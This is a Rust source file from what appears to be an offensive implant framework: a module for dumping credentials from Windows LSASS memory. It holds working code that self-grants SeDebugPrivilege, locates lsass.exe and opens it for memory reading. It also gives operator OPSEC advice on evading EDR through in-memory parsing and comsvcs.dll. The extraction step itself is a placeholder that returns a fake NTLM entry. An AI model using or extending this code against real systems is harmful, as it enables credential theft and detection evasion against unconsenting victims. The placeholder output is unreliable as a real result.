//! LSASS memory credential extraction
//!
//! Extracts credentials from the Local Security Authority Subsystem Service.
//! This is a high-value target but also heavily monitored by EDR.
//!
//! ## MITRE ATT&CK
//! - T1003.001: OS Credential Dumping: LSASS Memory
//!
//! ## OPSEC
//! - LSASS access is a primary EDR detection vector
//! - Consider alternatives: SAM, DPAPI, cached credentials
//! - Use indirect methods when possible (comsvcs.dll, etc.)

#[allow(unused_imports)]
use common::{CredentialInfo, CredentialOutput, KrakenError};
use protocol::CredDumpLsass;

/// Dump credentials from LSASS memory
#[cfg(windows)]
pub fn dump(req: &CredDumpLsass) -> Result<CredentialOutput, KrakenError> {
    use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
    #[allow(unused_imports)]
    use windows_sys::Win32::System::Diagnostics::Debug::MiniDumpWithFullMemory;
    use windows_sys::Win32::System::Threading::{
        OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
    };

    // Self-elevate: enable SeDebugPrivilege on the current thread's process
    // token so we can open LSASS.  This is the standard pattern — each task
    // runs on its own blocking thread, so we cannot rely on a prior
    // `token enable-priv` call having persisted.
    enable_se_debug_privilege()?;

    let mut credentials = Vec::new();

    // Find LSASS process
    let lsass_pid = find_lsass_pid()?;

    unsafe {
        // Open LSASS process
        let process_handle: HANDLE = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            0,
            lsass_pid,
        );

        if process_handle == 0 {
            return Err(KrakenError::Module(
                "Failed to open LSASS process - check privileges".into(),
            ));
        }

        // For memory dumping approach (writes to disk - more detectable)
        if req.method == "minidump" {
            // MiniDumpWriteDump approach - creates file on disk
            // This is detectable but reliable
            tracing::warn!("MiniDump method writes to disk - consider in-memory parsing");
        }

        // In-memory parsing would use:
        // 1. ReadProcessMemory to read LSASS memory
        // 2. Parse credential structures directly
        // 3. No disk artifacts

        // Framework placeholder - actual implementation would parse
        // credential structures from memory
        credentials.push(CredentialInfo {
            credential_type: "ntlm".to_string(),
            domain: "WORKGROUP".to_string(),
            username: "user".to_string(),
            data: "[in-memory extraction placeholder]".to_string(),
            source: "LSASS".to_string(),
        });

        CloseHandle(process_handle);
    }

    Ok(CredentialOutput { credentials })
}

/// Enable SeDebugPrivilege on the current process token.
///
/// LSASS is a protected process; opening it requires SeDebugPrivilege.
/// Because each implant task runs on a separate `spawn_blocking` thread,
/// privileges enabled by a prior task (e.g. `token enable-priv`) do not
/// persist.  We therefore self-elevate at the start of every LSASS dump.
///
/// If the process is not running at High integrity (i.e. not elevated),
/// `AdjustTokenPrivileges` will report ERROR_NOT_ALL_ASSIGNED and we
/// return a clear error telling the operator to run as admin.
#[cfg(windows)]
fn enable_se_debug_privilege() -> Result<(), KrakenError> {
    use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, LUID};
    use windows_sys::Win32::Security::{
        AdjustTokenPrivileges, LookupPrivilegeValueW, SE_PRIVILEGE_ENABLED,
        TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY,
    };
    use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

    const PRIV_NAME: &str = "SeDebugPrivilege";
    let name_wide: Vec<u16> = PRIV_NAME.encode_utf16().chain(std::iter::once(0)).collect();

    unsafe {
        // Open current process token with adjust + query rights.
        let mut token: HANDLE = 0;
        if OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut token,
        ) == 0
        {
            return Err(KrakenError::Module(format!(
                "OpenProcessToken failed ({}): SeDebugPrivilege required — run implant as admin",
                GetLastError()
            )));
        }

        // Look up the LUID for SeDebugPrivilege.
        let mut luid = LUID {
            LowPart: 0,
            HighPart: 0,
        };
        if LookupPrivilegeValueW(std::ptr::null(), name_wide.as_ptr(), &mut luid) == 0 {
            CloseHandle(token);
            return Err(KrakenError::Module(format!(
                "LookupPrivilegeValueW({PRIV_NAME}) failed ({}): SeDebugPrivilege required — run implant as admin",
                GetLastError()
            )));
        }

        // Build a single-privilege TOKEN_PRIVILEGES structure.
        let mut tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [windows_sys::Win32::Security::LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };

        if AdjustTokenPrivileges(
            token,
            0, // DisableAllPrivileges = FALSE
            &mut tp,
            std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        ) == 0
        {
            let err = GetLastError();
            CloseHandle(token);
            return Err(KrakenError::Module(format!(
                "AdjustTokenPrivileges failed ({err}): SeDebugPrivilege required — run implant as admin"
            )));
        }

        // AdjustTokenPrivileges can return success even when the privilege
        // is not held.  ERROR_NOT_ALL_ASSIGNED (1300) means the token does
        // not actually possess the privilege.
        let last = GetLastError();
        if last == 1300 {
            CloseHandle(token);
            return Err(KrakenError::Module(
                "SeDebugPrivilege not held — run implant as admin (elevated/High IL)".into(),
            ));
        }

        CloseHandle(token);
    }

    tracing::debug!("LSASS dump: SeDebugPrivilege enabled on current thread");
    Ok(())
}

#[cfg(windows)]
fn find_lsass_pid() -> Result<u32, KrakenError> {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return Err(KrakenError::Module("Failed to create process snapshot".into()));
        }

        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

        if Process32FirstW(snapshot, &mut entry) == 0 {
            CloseHandle(snapshot);
            return Err(KrakenError::Module("Failed to enumerate processes".into()));
        }

        loop {
            let name: String = entry
                .szExeFile
                .iter()
                .take_while(|&&c| c != 0)
                .map(|&c| c as u8 as char)
                .collect();

            if name.to_lowercase() == "lsass.exe" {
                CloseHandle(snapshot);
                return Ok(entry.th32ProcessID);
            }

            if Process32NextW(snapshot, &mut entry) == 0 {
                break;
            }
        }

        CloseHandle(snapshot);
        Err(KrakenError::Module("LSASS process not found".into()))
    }
}

#[cfg(not(windows))]
pub fn dump(_req: &CredDumpLsass) -> Result<CredentialOutput, KrakenError> {
    Err(KrakenError::Module(
        "LSASS extraction only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(not(windows))]
    fn test_lsass_unsupported_platform() {
        let req = CredDumpLsass { method: String::new() };
        let result = dump(&req);
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("only supported on Windows"));
    }
}
